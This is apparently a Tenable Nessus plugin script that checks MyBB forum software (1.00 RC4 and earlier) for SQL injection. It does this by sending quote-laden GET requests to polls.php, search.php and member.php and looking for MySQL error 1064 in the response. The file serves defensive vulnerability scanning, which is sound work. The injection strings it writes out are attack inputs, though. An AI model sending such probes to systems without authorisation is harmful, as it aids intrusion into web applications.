#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(19525);
  script_version ("$Revision: 1.12 $");

  script_cve_id("CVE-2005-2580", "CVE-2005-2697", "CVE-2005-2778");
  script_bugtraq_id(14553, 14615, 14684);
  script_xref(name:"OSVDB", value:"19030");
  script_xref(name:"OSVDB", value:"19031");
  script_xref(name:"OSVDB", value:"19032");
  script_xref(name:"OSVDB", value:"19033");
  script_xref(name:"OSVDB", value:"19139");

  script_name(english:"MyBB <= 1.00 RC4 Multiple SQL Injection Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple SQL injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote version of MyBB is prone to several SQL injection attacks
due to its failure to sanitize user-supplied input to the 'username'
parameter of the 'admin/index.php' script as well as the 'location'
variable (which comes from the REQUEST_URI) of the 'global.php' script
before using it in database queries.  This may allow an attacker to
uncover sensitive information (such as password hashes), gain
administrative access to the application, modify existing data, and
launch attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/407960" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/408624" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/409523" );
 script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=3350" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch mentioned in the vendor's advisory or enable PHP's
'magic_quotes_gpc' setting." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple SQL injection vulnerabilities in MyBB <= RC4";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 
  script_dependencie("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


exploits = make_list(
  string(
    "/polls.php?",
    "action=newpoll&",
    "tid=1&",
    "polloptions='", SCRIPT_NAME
  ),
  string(
    "/search.php?",
    "action='", SCRIPT_NAME
  ),
  string(
    "/search.php?",
    "action=finduser&",
    "uid=-1'", SCRIPT_NAME
  ),
  string(
    "/member.php?",
    "action=profile&",
    "uid=lastposter&",
    "fid=-1'", SCRIPT_NAME
  )
);


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaws.
  foreach exploit (exploits) {
    w = http_send_recv3(method:"GET", item:string(dir, exploit), port:port);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if we see a syntax error with our script name.
    if (
      egrep(
        string:res,
        pattern:string("mySQL error: 1064<br>.+near '", SCRIPT_NAME, "', ip=.+Query: UPDATE .*online SET uid=")
      )
    ) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
